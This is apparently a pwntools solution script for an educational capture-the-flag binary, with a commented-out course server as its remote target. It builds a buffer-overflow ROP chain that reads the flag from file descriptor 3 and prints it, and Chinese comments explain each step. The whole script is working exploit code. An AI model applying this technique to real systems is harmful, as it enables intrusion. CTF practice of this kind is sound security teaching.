from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./hello-world')
# r = remote('edu-ctf.zoolab.org', '30212')

r.sendlineafter('Hello, world !', b'\xff')

fill = 'A'*119
fill_r15 = 0

pop_rdi = 0x4013a3
pop_rsi_r15 = 0x4013a1
buf_addr = 0x404040

plt_read = 0x401090
plt_puts = 0x401080

main_code = 0x401310
plt_fflush = 0x4010a0
FILE_stdout_ptr = 0x404050

code = flat(
    fill,
    pop_rsi_r15,
    buf_addr,
    fill_r15,
    pop_rdi,
    0x3,
    plt_read,
    # 從fd3讀flag到0x404040
    pop_rdi,
    buf_addr,
    # 把0x404040放到rdi做puts
    # plt_puts, 剛好可以接下面main code上的puts

    # 沒有辦法對stdout_ptr做deaddress
    # 所以利用回去main code裡面觸發fflush(stdout)
    main_code
    # (原本沒有用fflush,local也印的出來)
)

r.sendline(code)
# gdb.attach(r)
r.interactive()

# rdx size=0x200
# rsi pos=0x404000
# rdi fd=0x3
# 0x404020

# rdi pos=0x404000
# 0x404018
